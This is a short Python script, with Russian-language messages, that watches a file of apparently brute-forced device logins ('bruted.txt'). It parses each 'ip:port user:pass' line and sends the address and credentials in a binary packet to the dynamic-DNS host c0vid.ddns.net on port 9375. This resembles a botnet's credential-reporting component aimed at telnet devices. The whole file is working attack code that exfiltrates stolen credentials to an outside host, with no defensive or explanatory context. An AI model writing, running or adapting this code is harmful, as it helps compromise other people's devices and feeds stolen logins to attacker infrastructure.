import time
import socket
import struct

def watch_file(file_path, exclude_patterns):
    try:
        with open(file_path, 'r') as file:
            file.seek(0, 2)

            while True:
                line = file.readline()
                if not line:
                    time.sleep(0.1)
                    continue

                line = line.strip()

                if any(pattern in line for pattern in exclude_patterns):
                    continue

                try:
                    ip_port, user_pass = line.split(" ", 1)
                    ip, port = ip_port.split(":")
                    username, password = user_pass.split(":")

                    daddr = struct.unpack('!I', socket.inet_aton(ip))[0]
                    dport = int(port)
                    auth = {'username': username, 'password': password}

                    report_working(daddr, dport, auth)

                except ValueError:
                    print(f"Ошибка строки: {line}")

    except FileNotFoundError:
        print(f"Нету файла {file_path}")
    except KeyboardInterrupt:
        print("\nВыход")

def report_working(daddr, dport, auth):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('c0vid.ddns.net', 9375))
            s.send(struct.pack('B', 0))
            s.send(struct.pack('!I', daddr))
            s.send(struct.pack('!H', dport))
            s.send(struct.pack('B', len(auth['username'])))
            s.send(auth['username'].encode('utf-8'))
            s.send(struct.pack('B', len(auth['password'])))
            s.send(auth['password'].encode('utf-8'))
            print(f"[report] {daddr}:23 {len(auth['username'])}:{len(auth['password'])}")
    except Exception as e:
        print(f"Ошибка отправке данных: {e}")

if __name__ == "__main__":
    file_path = "bruted.txt"

    exclude_patterns = [
        "root:",
        "admin:",
        "root:root"
    ]

    watch_file(file_path, exclude_patterns)
